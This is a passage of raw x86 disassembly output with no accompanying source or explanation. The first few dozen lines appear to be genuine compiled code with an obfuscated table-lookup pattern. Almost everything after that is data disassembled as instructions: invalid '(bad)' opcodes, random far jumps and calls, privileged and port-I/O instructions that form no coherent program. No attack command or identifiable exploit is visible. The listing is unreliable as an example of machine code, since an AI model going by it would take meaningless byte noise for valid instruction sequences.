  41e988:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  41e98f:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  41e996:	mov    DWORD PTR [ebp-0x1c],eax
  41e999:	mov    eax,DWORD PTR [ebp-0x20]
  41e99c:	xor    eax,esi
  41e99e:	add    eax,edi
  41e9a0:	jmp    0x423b08
  41e9a5:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41e9ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9af:	mov    edx,DWORD PTR [ebp-0xc]
  41e9b2:	xor    eax,esi
  41e9b4:	add    eax,edi
  41e9b6:	imul   eax,edx
  41e9b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9bc:	mov    al,BYTE PTR [eax+edx*1]
  41e9bf:	mov    BYTE PTR [ebp-0x1],al
  41e9c2:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9c5:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c8:	xor    eax,esi
  41e9ca:	add    eax,edi
  41e9cc:	imul   eax,edx
  41e9cf:	mov    edx,DWORD PTR [ebp-0x40]
  41e9d2:	xor    edx,esi
  41e9d4:	add    eax,edx
  41e9d6:	mov    edx,DWORD PTR [ebp-0x8]
  41e9d9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  41e9e1:	jmp    0x420d2f
  41e9e6:	iret   
  41e9e7:	and    edi,DWORD PTR [esi+0x59]
  41e9ea:	(bad)  
  41e9eb:	daa    
  41e9ec:	mov    ds:0x1c7877a3,eax
  41e9f1:	jle    0x41ea3c
  41e9f3:	jmp    0xda55dad2
  41e9f8:	popa   
  41e9f9:	bound  edx,QWORD PTR [ecx+0x5f]
  41e9fc:	bound  esp,QWORD PTR [edx+0x48]
  41e9ff:	pop    es
  41ea00:	dec    ebx
  41ea01:	xor    ebx,ebp
  41ea03:	fbstp  TBYTE PTR ds:0xb67dad0a
  41ea09:	movups xmm3,XMMWORD PTR [edx+0x49b61643]
  41ea10:	mov    bl,0xd2
  41ea12:	mov    edx,0xb9386f77
  41ea17:	bound  esi,QWORD PTR [ecx+0x42]
  41ea1a:	pop    ss
  41ea1b:	popf   
  41ea1c:	pop    ss
  41ea1d:	cld    
  41ea1e:	cli    
  41ea1f:	jne    0x41e9f7
  41ea21:	adc    DWORD PTR [ecx],0xf606d2db
  41ea27:	arpl   WORD PTR [ebp+0x6a],sp
  41ea2a:	mov    bl,0x9f
  41ea2c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41ea2e:	dec    edi
  41ea2f:	inc    esi
  41ea30:	mov    ebp,0xaa92f934
  41ea35:	push   edi
  41ea36:	cs pop edx
  41ea38:	mov    dl,0x67
  41ea3a:	push   eax
  41ea3b:	sbb    al,0x2d
  41ea3d:	pop    edx
  41ea3e:	sbb    BYTE PTR [ecx],cl
  41ea40:	mov    ebx,0x1ed7764a
  41ea45:	pop    edi
  41ea46:	cli    
  41ea47:	das    
  41ea48:	test   DWORD PTR [eax-0x32],0x3459e9
  41ea4f:	aas    
  41ea50:	xor    BYTE PTR [eax],dl
  41ea52:	and    eax,0x72ba89cc
  41ea57:	fs pop ecx
  41ea59:	or     BYTE PTR [ebx-0x62b5f86d],bh
  41ea5f:	mov    edx,0x94f06dc
  41ea64:	mov    edx,0x300e5506
  41ea69:	mov    WORD PTR [eax],ds
  41ea6b:	ins    DWORD PTR es:[edi],dx
  41ea6c:	shl    BYTE PTR [esi+0x2c02c834],1
  41ea72:	inc    ebx
  41ea73:	icebp  
  41ea74:	add    al,0x2f
  41ea76:	les    edx,FWORD PTR [edi-0x45]
  41ea79:	icebp  
  41ea7a:	dec    ebx
  41ea7b:	sub    BYTE PTR [eax+0x25e5f9e8],dl
  41ea81:	push   ebx
  41ea82:	mov    eax,ds:0x550cb7d5
  41ea87:	(bad)  
  41ea88:	sbb    BYTE PTR ds:[eax+ecx*8+0x66],ah
  41ea8d:	fcmovb st,st(4)
  41ea8f:	mov    ecx,DWORD PTR ds:0x92cea22f
  41ea95:	retf   
  41ea96:	and    esi,DWORD PTR [ecx-0x16dd6296]
  41ea9c:	and    DWORD PTR [edx+0x7d],ecx
  41ea9f:	enter  0x2260,0xab
  41eaa3:	xchg   esi,eax
  41eaa4:	mov    bh,0xee
  41eaa6:	popa   
  41eaa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa8:	sbb    dl,dl
  41eaaa:	jo     0x41eaf5
  41eaac:	daa    
  41eaad:	mov    dh,0xe2
  41eaaf:	xchg   DWORD PTR [ebp-0x3259fb0],esp
  41eab5:	aaa    
  41eab6:	jge    0x41eae7
  41eab8:	xchg   ebx,eax
  41eab9:	loopne 0x41eaf4
  41eabb:	fiadd  DWORD PTR [esi]
  41eabd:	dec    ebp
  41eabe:	mov    ecx,0x9fa99284
  41eac3:	sbb    ecx,0xfffffff1
  41eac6:	je     0x41eb20
  41eac8:	xchg   ebx,eax
  41eac9:	mov    edi,edi
  41eacb:	retf   
  41eacc:	hlt    
  41eacd:	test   BYTE PTR [esi-0x1046128a],bl
  41ead3:	ins    BYTE PTR es:[edi],dx
  41ead4:	les    edi,FWORD PTR [esp+ebx*4-0x29]
  41ead8:	jg     0x41ea74
  41eada:	xor    edx,0x58b64e96
  41eae0:	mov    ebx,0xc07e7389
  41eae5:	pop    eax
  41eae6:	dec    eax
  41eae7:	fisttp DWORD PTR [ecx]
  41eae9:	adc    cl,BYTE PTR [ecx]
  41eaeb:	leave  
  41eaec:	sbb    BYTE PTR [esi-0x216128de],0x3b
  41eaf3:	adc    ch,BYTE PTR [eax-0x5c0f6cb9]
  41eaf9:	jg     0x41eacb
  41eafb:	inc    esp
  41eafc:	mov    eax,0x4157bb72
  41eb01:	inc    eax
  41eb02:	aad    0x62
  41eb04:	mov    bl,0xbf
  41eb06:	push   cs
  41eb07:	xor    esp,DWORD PTR [esi-0x7b]
  41eb0a:	data16 jns 0x41eac5
  41eb0d:	pavgb  mm1,QWORD PTR [esi]
  41eb10:	dec    eax
  41eb11:	aaa    
  41eb12:	push   cs
  41eb13:	mov    ch,0xd
  41eb15:	shl    ecx,1
  41eb17:	fs or  al,0xd5
  41eb1a:	popa   
  41eb1b:	xchg   DWORD PTR [esi],esi
  41eb1d:	lods   eax,DWORD PTR ds:[esi]
  41eb1e:	fst    QWORD PTR [esp+ecx*4+0x5a]
  41eb22:	out    dx,eax
  41eb23:	int    0xda
  41eb25:	inc    ebx
  41eb26:	pop    edx
  41eb27:	pushf  
  41eb28:	jle    0x41eb55
  41eb2a:	das    
  41eb2b:	les    esp,FWORD PTR [eax-0x7e]
  41eb2e:	das    
  41eb2f:	sub    al,0x1d
  41eb31:	stos   BYTE PTR es:[edi],al
  41eb32:	stc    
  41eb33:	or     esp,DWORD PTR [edi+eax*4+0x5e]
  41eb37:	adc    esp,DWORD PTR fs:[edi+0x570758ea]
  41eb3e:	sahf   
  41eb3f:	sub    dl,BYTE PTR [ebx]
  41eb41:	pop    ss
  41eb42:	ret    
  41eb43:	sahf   
  41eb44:	ret    0x46ea
  41eb47:	xor    al,0x9b
  41eb49:	retf   0x3be7
  41eb4c:	dec    edx
  41eb4d:	retf   0xcebd
  41eb50:	sub    BYTE PTR [edx+edi*2-0x21],0xea
  41eb55:	push   ecx
  41eb56:	push   esi
  41eb57:	mov    bp,0x7a4d
  41eb5b:	stos   DWORD PTR es:[edi],eax
  41eb5c:	fcmovne st,st(4)
  41eb5e:	adc    ecx,DWORD PTR [esi-0x46958f65]
  41eb64:	fistp  QWORD PTR [edi]
  41eb66:	mov    BYTE PTR [ebx],cl
  41eb68:	jbe    0x41ebdd
  41eb6a:	dec    edi
  41eb6b:	dec    edx
  41eb6c:	cmp    cl,bl
  41eb6e:	and    ecx,DWORD PTR [esi+0x4d]
  41eb71:	clc    
  41eb72:	(bad)  
  41eb74:	cs cmc 
  41eb76:	and    bh,BYTE PTR [ecx+0x576b0033]
  41eb7c:	or     eax,0x4d3c8b81
  41eb81:	xchg   ecx,eax
  41eb82:	jp     0x41eb8e
  41eb84:	mov    cl,0x2d
  41eb86:	int3   
  41eb87:	aaa    
  41eb88:	inc    esi
  41eb89:	pop    edi
  41eb8a:	dec    eax
  41eb8b:	lods   eax,DWORD PTR ds:[esi]
  41eb8c:	add    al,0x35
  41eb8e:	cld    
  41eb8f:	dec    ecx
  41eb90:	xchg   ebx,eax
  41eb91:	rcr    BYTE PTR [eax-0x30],0x9d
  41eb95:	nop
  41eb96:	ret    0x4e1
  41eb99:	push   ss
  41eb9a:	dec    edi
  41eb9b:	add    bh,BYTE PTR [eax-0x3]
  41eb9e:	lock test eax,0x9576d5c8
  41eba4:	push   esp
  41eba5:	add    al,BYTE PTR [edx]
  41eba7:	cmp    cl,dh
  41eba9:	fs loopne 0x41eba2
  41ebac:	sbb    cl,bh
  41ebae:	loope  0x41ebdb
  41ebb0:	out    0x15,eax
  41ebb2:	sti    
  41ebb3:	inc    edi
  41ebb4:	pusha  
  41ebb5:	loopne 0x41eba5
  41ebb7:	retf   
  41ebb8:	jbe    0x41ebf4
  41ebba:	xchg   esi,eax
  41ebbb:	loope  0x41eb9a
  41ebbd:	sub    BYTE PTR [ebx],bl
  41ebbf:	fdiv   QWORD PTR [esi]
  41ebc1:	jmp    0xaaa8:0xc0c2b356
  41ebc8:	inc    ecx
  41ebc9:	out    dx,eax
  41ebca:	(bad)  
  41ebcb:	movq   QWORD PTR [edi+eiz*8-0x77374a62],mm7
  41ebd3:	or     al,ah
  41ebd5:	ja     0x41ec12
  41ebd7:	stos   DWORD PTR es:[edi],eax
  41ebd8:	jg     0x41ebdb
  41ebda:	jnp    0x41ec05
  41ebdc:	mov    ds:0x5d0247d4,al
  41ebe1:	lods   al,BYTE PTR ds:[esi]
  41ebe2:	jge    0x41ec09
  41ebe4:	ds (bad) 
  41ebe6:	push   eax
  41ebe7:	arpl   WORD PTR [ecx],bx
  41ebe9:	and    eax,0x6c00eb31
  41ebee:	jmp    DWORD PTR [ebx-0x4bfbbbd7]
  41ebf4:	es jge 0x41ec45
  41ebf7:	retf   
  41ebf8:	leave  
  41ebf9:	imul   ebx
  41ebfb:	xlat   BYTE PTR ds:[ebx]
  41ebfc:	shr    bl,cl
  41ebfe:	mov    bh,0xad
  41ec00:	mov    ch,BYTE PTR [edi+ebx*8-0x4dfb05d1]
  41ec07:	es inc esi
  41ec09:	cld    
  41ec0a:	call   0x672e78ec
  41ec0f:	push   ecx
  41ec10:	aas    
  41ec11:	sbb    eax,0x1a86ccb3
  41ec16:	sub    bh,dl
  41ec18:	jmp    0x41ec3d
  41ec1a:	mov    ah,0xcd
  41ec1c:	sti    
  41ec1d:	push   edx
  41ec1e:	mov    es,WORD PTR [ebx-0x5e]
  41ec21:	mov    ds:0x8861585a,al
  41ec26:	loope  0x41ec71
  41ec28:	push   edx
  41ec29:	jmp    FWORD PTR [ebx-0x7d]
  41ec2c:	rcl    DWORD PTR [esi],cl
  41ec2e:	or     eax,0x6f73dc58
  41ec33:	adc    ecx,DWORD PTR [ebx-0x45]
  41ec36:	inc    ecx
  41ec37:	inc    esi
  41ec38:	data16 jae 0x41ebe8
  41ec3b:	adc    cl,BYTE PTR [edx+0x446d8559]
  41ec41:	pop    esp
  41ec42:	inc    ebp
  41ec43:	je     0x41ecb0
  41ec45:	ss push esi
  41ec47:	jge    0x41ebf9
  41ec49:	aad    0xb8
  41ec4b:	mov    dh,BYTE PTR [eax-0x26]
  41ec4e:	mov    WORD PTR [ebp+0x51],cs
  41ec51:	dec    ecx
  41ec52:	lea    ecx,cs:[edx-0xa7cfb13]
  41ec59:	add    dl,BYTE PTR [ecx+0x6f]
  41ec5c:	fdivrp st(1),st
  41ec5e:	xchg   ecx,eax
  41ec5f:	and    DWORD PTR [eax-0x2a33b607],ebp
  41ec65:	xchg   edi,eax
  41ec66:	xchg   ecx,eax
  41ec67:	sti    
  41ec68:	pop    ds
  41ec69:	pop    edx
  41ec6a:	dec    esp
  41ec6b:	add    BYTE PTR [ebp+0x4d335993],dh
  41ec71:	push   0x8d634aa
  41ec76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec77:	mov    bh,BYTE PTR [ecx]
  41ec79:	mov    ebx,0x4b1334b9
  41ec7e:	int3   
  41ec7f:	ss xchg edx,eax
  41ec81:	mov    al,0xb4
  41ec83:	push   esp
  41ec84:	push   ss
  41ec85:	call   0x6801feb9
  41ec8a:	lock push edx
  41ec8c:	push   esi
  41ec8d:	and    eax,0xc4beaec9
  41ec92:	add    BYTE PTR [esi],bl
  41ec94:	fucomp st(2)
  41ec96:	call   0x7963:0x528db29c
  41ec9d:	mov    bh,0xa7
  41ec9f:	adc    esp,esp
  41eca1:	and    al,0x66
  41eca3:	xchg   esp,eax
  41eca4:	pusha  
  41eca5:	(bad)  
  41eca6:	repz or al,0xb4
  41eca9:	dec    edx
  41ecaa:	adc    cl,BYTE PTR [edi]
  41ecac:	cmp    edx,DWORD PTR [ebx]
  41ecae:	jge    0x41ec54
  41ecb0:	sti    
  41ecb1:	cdq    
  41ecb2:	in     al,dx
  41ecb3:	xchg   ebp,eax
  41ecb4:	pop    edx
  41ecb5:	popf   
  41ecb6:	mov    esp,0xb9033eef
  41ecbb:	out    0xc8,eax
  41ecbd:	pand   mm3,QWORD PTR [si+0x5944]
  41ecc3:	mov    ch,0x5a
  41ecc5:	push   es
  41ecc6:	sub    al,0xc7
  41ecc8:	adc    ch,BYTE PTR [edi+0x25585b1a]
  41ecce:	fdivr  DWORD PTR [ecx+ecx*2]
  41ecd1:	loopne 0x41eca4
  41ecd3:	or     eax,0x9ff5b34
  41ecd8:	rol    DWORD PTR [ebp-0x3eaf9bfc],1
  41ecde:	iret   
  41ecdf:	jbe    0x41ecd8
  41ece1:	call   0xf7f52dfa
  41ece6:	sub    al,BYTE PTR [esi-0x73ddc60a]
  41ecec:	inc    edi
  41eced:	fstp   QWORD PTR [edx+0x5e671a46]
  41ecf3:	and    eax,0x48d5f67d
  41ecf8:	and    ecx,0x67
  41ecfb:	mov    al,0x58
  41ecfd:	inc    edi
  41ecfe:	or     eax,0xc4b51fbd
  41ed03:	mov    esi,0xccb5c4fe
  41ed08:	repz cmp BYTE PTR [ecx-0x4bd7e02d],cl
  41ed0f:	(bad)  
  41ed10:	mov    esp,0x7ddd1b5a
  41ed15:	jno    0x41ed3a
  41ed17:	int3   
  41ed18:	sbb    DWORD PTR [edi-0x7ec2f435],edi
  41ed1e:	in     eax,dx
  41ed1f:	ins    BYTE PTR es:[edi],dx
  41ed20:	mov    ebx,0xcd4a78a4
  41ed25:	inc    edx
  41ed26:	dec    edx
  41ed27:	repnz cmc 
  41ed29:	or     bl,BYTE PTR [edx-0xc341dd3]
  41ed2f:	(bad)  
  41ed30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed31:	mov    bh,BYTE PTR [ecx+0x2d]
  41ed34:	iret   
  41ed35:	jmp    0xef93:0x7f29342a
  41ed3c:	arpl   WORD PTR [ebx+0x1b4e0035],dx
  41ed42:	pop    edx
  41ed43:	daa    
  41ed44:	mov    ecx,DWORD PTR [ecx]
  41ed46:	popa   
  41ed47:	bound  esp,QWORD PTR [eax+ebp*8-0x604b9fa8]
  41ed4e:	nop
  41ed4f:	jmp    0x80ff:0xd2561379
  41ed56:	mov    ebx,0xb70d4ea2
  41ed5b:	mov    ebx,0x93f7742
  41ed60:	rcl    DWORD PTR [edx+0x480e6e8],1
  41ed66:	add    DWORD PTR [edi-0x4b],0x6e96a919
  41ed6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed6e:	fcomp  st(7)
  41ed70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed71:	inc    esi
  41ed72:	jge    0x41ed7f
  41ed74:	loopne 0x41edd8
  41ed76:	dec    esi
  41ed77:	pop    es
  41ed78:	dec    edx
  41ed79:	pusha  
  41ed7a:	dec    ebp
  41ed7b:	inc    ebp
  41ed7c:	ins    DWORD PTR es:[edi],dx
  41ed7d:	xchg   esp,eax
  41ed7e:	cdq    
  41ed7f:	in     al,dx
  41ed80:	sbb    DWORD PTR [esi],eax
  41ed82:	(bad)  [eax-0x20]
  41ed85:	add    eax,DWORD PTR ds:0x97c786de
  41ed8b:	dec    esi
  41ed8c:	gs pop es
  41ed8e:	add    ah,bh
  41ed90:	lods   eax,DWORD PTR ds:[esi]
  41ed91:	or     eax,0x64e9d8dc
  41ed96:	and    al,0x32
  41ed98:	pop    ebx
  41ed99:	cmp    bh,ah
  41ed9b:	xchg   edx,eax
  41ed9c:	std    
  41ed9d:	push   cs
  41ed9e:	xor    eax,ebp
  41eda0:	dec    ebp
  41eda1:	hlt    
  41eda2:	inc    esi
  41eda3:	mov    eax,eax
  41eda5:	jmp    0xb9a7:0xa0885d9e
  41edac:	sub    dl,cl
  41edae:	je     0x41ed90
  41edb0:	out    0x50,al
  41edb2:	ins    DWORD PTR es:[edi],dx
  41edb3:	ret    
  41edb4:	sbb    BYTE PTR [edx+0x2e0fa1e3],ch
  41edba:	iret   
  41edbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edbc:	push   cs
  41edbd:	cwde   
  41edbe:	icebp  
  41edbf:	pop    ds
  41edc0:	imul   esp,DWORD PTR [ebp+0x332316ad],0xffffffe7
  41edc7:	ds stos DWORD PTR es:[edi],eax
  41edc9:	lods   al,BYTE PTR ds:[esi]
  41edca:	shr    DWORD PTR [ebx-0x5c],0x46
  41edce:	push   ecx
  41edcf:	fs pop ss
  41edd1:	fild   QWORD PTR ds:0x68517bf1
  41edd7:	push   cs
  41edd8:	lahf   
  41edd9:	push   cs
  41edda:	rcl    DWORD PTR [esi+eax*8],1
  41eddd:	imul   esi,ebx,0x114842ee
  41ede3:	fwait
  41ede4:	call   0x47e8:0x6f4ba3e9
  41edeb:	dec    esp
  41edec:	mov    ds:0x4d66aa40,al
  41edf1:	je     0x41edaa
  41edf3:	sbb    DWORD PTR [ebp+ebp*2+0x2aa72623],ebx
  41edfa:	cmp    BYTE PTR [esp+ebx*1-0x3c8a957c],dh
  41ee01:	frstor [ecx]
  41ee03:	sub    ah,dl
  41ee05:	jmp    0x41ee4e
  41ee07:	rol    DWORD PTR [edx+eiz*2+0x30c44148],0x26
  41ee0f:	imul   eax,DWORD PTR [ebp-0x2a],0x5da61105
  41ee16:	aaa    
  41ee17:	sub    BYTE PTR [ebp+0x6e],0x26
  41ee1b:	in     eax,0x5a
  41ee1d:	pop    esp
  41ee1e:	out    0x17,eax
  41ee20:	fwait
  41ee21:	(bad)  
  41ee22:	sbb    DWORD PTR [edi],eax
  41ee24:	dec    edi
  41ee25:	shl    DWORD PTR [ecx+0x63],cl
  41ee28:	push   0x11
  41ee2a:	sbb    al,0xe8
  41ee2c:	pop    esp
  41ee2d:	xor    ecx,DWORD PTR [edi+ebp*8+0xd]
  41ee31:	mov    ds:0x2a3107d8,al
  41ee36:	adc    dh,cl
  41ee38:	in     eax,dx
  41ee39:	jnp    0x41ee31
  41ee3b:	test   BYTE PTR [ecx-0x2733194b],cl
  41ee41:	data16 jne 0x41ee6d
  41ee44:	imul   ebx,DWORD PTR ds:0xd3535c3a,0x5588956a
  41ee4e:	dec    ecx
  41ee4f:	or     BYTE PTR [ebp+0x1b2dc1d8],dl
  41ee55:	push   ss
  41ee56:	and    dl,BYTE PTR [ecx]
  41ee58:	cmp    eax,0xd9b49c29
  41ee5d:	mov    al,ds:0xc24bde04
  41ee62:	cmp    BYTE PTR [esi+0x7f],0xde
  41ee66:	jo     0x41ee78
  41ee68:	popa   
  41ee69:	stos   BYTE PTR es:[edi],al
  41ee6a:	stos   DWORD PTR es:[edi],eax
  41ee6b:	mov    DWORD PTR [ecx],0x95c93ee2
  41ee71:	cmp    bh,al
  41ee73:	push   eax
  41ee74:	and    DWORD PTR [ecx-0x45906b15],edi
  41ee7a:	jecxz  0x41eef8
  41ee7c:	jno    0x41eef2
  41ee7e:	pop    ebp
  41ee7f:	ja     0x41eeb3
  41ee81:	jmp    0x2562:0x209f76a9
  41ee88:	jecxz  0x41ee3e
  41ee8a:	cmp    DWORD PTR [eax+ecx*1+0x3bb67290],0xb1f0e16c
  41ee95:	test   DWORD PTR [eax],ebx
  41ee97:	add    dh,BYTE PTR [ecx]
  41ee99:	int3   
  41ee9a:	arpl   cx,bx
  41ee9c:	cld    
  41ee9d:	and    esi,DWORD PTR [ebp-0x6b]
  41eea0:	repz xchg esi,eax
  41eea2:	and    dl,0x93
  41eea5:	in     ax,dx
  41eea7:	and    al,0xa4
  41eea9:	ss push eax
  41eeab:	dec    ebp
  41eeac:	sahf   
  41eead:	mov    eax,ds:0xe19b9465
  41eeb2:	lock mov al,ds:0x209a955b
  41eeb8:	lock out 0xb9,eax
  41eebb:	push   0xc56ae9c7
  41eec0:	xor    ebx,ecx
  41eec2:	sti    
  41eec3:	xchg   DWORD PTR [ebp+0x32],ecx
  41eec6:	push   esp
  41eec7:	adc    al,al
  41eec9:	xchg   DWORD PTR [ebp+0x1f],ebp
  41eecc:	inc    ecx
  41eecd:	pop    ebp
  41eece:	lds    eax,FWORD PTR [ecx]
  41eed0:	cmp    BYTE PTR [ebx-0x2d],cl
  41eed3:	call   0x7d82:0x8135d636
  41eeda:	push   ecx
  41eedb:	inc    ebx
  41eedc:	scas   al,BYTE PTR es:[edi]
  41eedd:	jl     0x41eea6
  41eedf:	jge    0x41eeaa
  41eee1:	mov    ds:0x3327e946,al
  41eee6:	mov    esp,0x28f71f89
  41eeeb:	xchg   ecx,eax
  41eeec:	and    bl,al
  41eeee:	jno    0x41eeab
  41eef0:	in     eax,dx
  41eef1:	addr16 ja 0x41ef23
  41eef4:	stos   BYTE PTR es:[edi],al
  41eef5:	mov    es,WORD PTR [eax-0x20ad0a71]
  41eefb:	call   0xccf6:0xcf8a9ba0
  41ef02:	lea    edi,[esi]
  41ef04:	ret    
  41ef05:	je     0x41ef25
  41ef07:	ror    BYTE PTR [edi+ecx*8+0x4f],0x11
  41ef0c:	fmul   QWORD PTR [esi]
  41ef0e:	or     ch,al
  41ef10:	dec    BYTE PTR [edi-0xedf03b1]
  41ef16:	cmp    BYTE PTR [ebp+0x35],0x46
  41ef1a:	xor    dh,BYTE PTR [ecx-0x4b]
  41ef1d:	lea    ebx,[ebx+eax*2-0x5118c372]
  41ef24:	inc    esi
  41ef25:	in     al,0xf9
  41ef27:	push   ecx
  41ef28:	jb     0x41ef12
  41ef2a:	cli    
  41ef2b:	xor    DWORD PTR [ebx+0x7c0d8ac4],ebp
  41ef31:	inc    esi
  41ef32:	stos   DWORD PTR es:[edi],eax
  41ef33:	call   0x537e:0xea0a5265
  41ef3a:	or     al,0x66
  41ef3c:	mov    ah,0x1c
  41ef3e:	sbb    edi,DWORD PTR ds:0x2de4cf6d
  41ef44:	jbe    0x41efa3
  41ef46:	pop    esi
  41ef47:	sub    BYTE PTR [esi+0x355ade1f],al
  41ef4d:	mov    edx,DWORD PTR [eax]
  41ef4f:	pop    es
  41ef50:	in     al,dx
  41ef51:	sbb    al,0x2f
  41ef53:	gs ins BYTE PTR es:[edi],dx
  41ef55:	cmp    al,0x9e
  41ef57:	imul   esp,DWORD PTR [esi+edi*1+0x3725939a],0x75e80d11
  41ef62:	jb     0x41ef4c
  41ef64:	fmul   st(1),st
  41ef66:	pop    ecx
  41ef67:	int    0x27
  41ef69:	jbe    0x41ef1d
  41ef6b:	test   DWORD PTR [ebp+0x3f],0xd8e5eb40
  41ef72:	iret   
  41ef73:	add    al,0x63
  41ef75:	sub    al,0xfb
  41ef77:	and    ecx,DWORD PTR [esi]
  41ef79:	inc    edi
  41ef7a:	loop   0x41ef5c
  41ef7c:	adc    al,0x6c
  41ef7e:	rdtsc  
  41ef80:	popa   
  41ef81:	ja     0x41efc2
  41ef83:	icebp  
  41ef84:	lods   al,BYTE PTR ds:[esi]
  41ef85:	xchg   esp,eax
  41ef86:	lods   al,BYTE PTR ds:[esi]
  41ef87:	sbb    ch,BYTE PTR cs:[ebp+0x64fd65c9]
  41ef8e:	hlt    
  41ef8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef90:	and    BYTE PTR [eax+0x18],bh
  41ef93:	inc    edi
  41ef94:	dec    edx
  41ef95:	and    dh,BYTE PTR [edi]
  41ef97:	fwait
  41ef98:	xor    cl,ch
  41ef9a:	pop    eax
  41ef9b:	addr16 mov al,0x47
  41ef9e:	pop    es
  41ef9f:	xchg   edi,eax
  41efa0:	into   
  41efa1:	adc    ah,al
  41efa3:	sub    BYTE PTR [ebp+0x79],bh
  41efa6:	cli    
  41efa7:	outs   dx,DWORD PTR ds:[esi]
  41efa8:	call   0xeb2a:0x22fd1a24
  41efaf:	jl     0x41f00e
  41efb1:	xchg   ecx,eax
  41efb2:	shr    DWORD PTR [edx-0xc],0xa3
  41efb6:	inc    eax
  41efb7:	xchg   esp,eax
  41efb8:	xor    edx,DWORD PTR ds:0x54d346ac
  41efbe:	mov    eax,0xcdf905df
  41efc3:	outs   dx,DWORD PTR ds:[esi]
  41efc4:	xor    esp,DWORD PTR [ebp+0x5c4d4782]
  41efca:	mov    cl,0x93
  41efcc:	jl     0x41efbd
  41efce:	pop    ebp
  41efcf:	shl    BYTE PTR [edi],0xe3
  41efd2:	mov    bh,0xd1
  41efd4:	sbb    ebp,edi
  41efd6:	stc    
  41efd7:	mov    al,0xd8
  41efd9:	adc    ch,BYTE PTR [esi-0x77fd3bf]
  41efdf:	adc    al,0x72
  41efe1:	rol    al,1
  41efe3:	xchg   ebp,eax
  41efe4:	loope  0x41efa4
  41efe6:	and    DWORD PTR [edi-0x3b95d9d8],edx
  41efec:	ffree  st(6)
  41efee:	mul    BYTE PTR [ecx]
  41eff0:	out    dx,al
  41eff1:	ror    BYTE PTR [ecx+esi*2],0xb0
  41eff5:	dec    esp
  41eff6:	add    dl,ah
  41eff8:	aaa    
  41eff9:	and    dl,BYTE PTR [ebx+0x71]
  41effc:	jmp    0xc569e1d5
  41f001:	xchg   ebp,eax
  41f002:	mov    BYTE PTR [edx+edi*8],ch
  41f005:	sub    ecx,edi
  41f007:	lods   eax,DWORD PTR ds:[esi]
  41f008:	adc    dl,BYTE PTR [edx]
  41f00a:	jp     0x41f07a
  41f00c:	mov    bh,0x4e
  41f00e:	enter  0xf74e,0x1b
  41f012:	mov    ds:0xc9643715,al
  41f017:	xchg   ecx,eax
  41f018:	fcmovbe st,st(7)
  41f01a:	int    0x77
  41f01c:	dec    ebx
  41f01d:	jg     0x41efb7
  41f01f:	xchg   ebx,eax
  41f020:	xor    eax,0x7646aa36
  41f025:	xor    eax,0xcfd93fab
  41f02a:	lods   al,BYTE PTR ds:[esi]
  41f02b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f02c:	shl    DWORD PTR [eax],1
  41f02e:	pop    eax
  41f02f:	popf   
  41f030:	jecxz  0x41f0a1
  41f032:	sbb    BYTE PTR [esi+0x87eda8d],cl
  41f038:	xchg   esp,eax
  41f039:	adc    BYTE PTR [esi],ch
  41f03b:	xchg   edx,eax
  41f03c:	lea    edi,[ebx-0x4c470389]
  41f042:	sub    DWORD PTR [edi+0x1dc5c54f],0xffffff9b
  41f049:	fdiv   QWORD PTR [edi+0x2128ea8b]
  41f04f:	xor    eax,0xe8c623ef
  41f054:	sahf   
  41f055:	sbb    ebx,DWORD PTR [edi+0x38]
  41f058:	cld    
  41f059:	ret    0x7653
  41f05c:	popf   
  41f05d:	and    DWORD PTR [esi],ebp
  41f05f:	and    esi,DWORD PTR [eax+0x66]
  41f062:	or     bh,BYTE PTR [ebx]
  41f064:	xchg   ebx,eax
  41f065:	aad    0xd8
  41f067:	inc    esi
  41f068:	fldenv [ecx+0x19]
  41f06b:	daa    
  41f06c:	pop    ebx
  41f06d:	pop    ebp
  41f06e:	jecxz  0x41f01c
  41f070:	add    al,0x67
  41f072:	ret    0xa3fa
  41f075:	adc    al,0xe8
  41f077:	push   cs
  41f078:	jo     0x41f0d8
  41f07a:	shl    BYTE PTR [edx+0x74cee3f2],cl
  41f080:	mov    eax,0x18edeeef
  41f085:	sbb    esp,DWORD PTR [esi-0x75]
  41f088:	push   edx
  41f089:	jbe    0x41f0cd
  41f08b:	lahf   
  41f08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f08d:	pop    esp
  41f08e:	out    0x99,eax
  41f090:	inc    esp
  41f091:	adc    al,0xe9
  41f093:	arpl   WORD PTR [ebp+0x513a30b8],dx
  41f099:	fld    DWORD PTR [eax+0x7b]
  41f09c:	out    0x13,al
  41f09e:	setle  bl
  41f0a1:	xor    bl,BYTE PTR [ecx]
  41f0a3:	pop    ebx
  41f0a4:	aaa    
  41f0a5:	lds    edx,FWORD PTR [ebp+0x52]
  41f0a8:	push   edi
  41f0a9:	jns    0x41f0a9
  41f0ab:	jae    0x41f0f1
  41f0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ae:	mov    ah,0x7f
  41f0b0:	sub    DWORD PTR [ebp-0x35169393],esi
  41f0b6:	fwait
  41f0b7:	imul   eax,DWORD PTR [eax],0x4d2444d4
  41f0bd:	or     eax,0xd19f3d13
  41f0c2:	push   cs
  41f0c3:	out    0xa5,eax
  41f0c5:	stos   BYTE PTR es:[edi],al
  41f0c6:	mov    esi,0xdd2ab702
  41f0cb:	scas   al,BYTE PTR es:[edi]
  41f0cc:	sub    BYTE PTR [esi+0x4153aba],ch
  41f0d2:	jns    0x41f146
  41f0d4:	fsubr  DWORD PTR [ebx+0x242be9ca]
  41f0da:	sub    DWORD PTR [esi],ebx
  41f0dc:	jp     0x41f0e4
  41f0de:	(bad)  
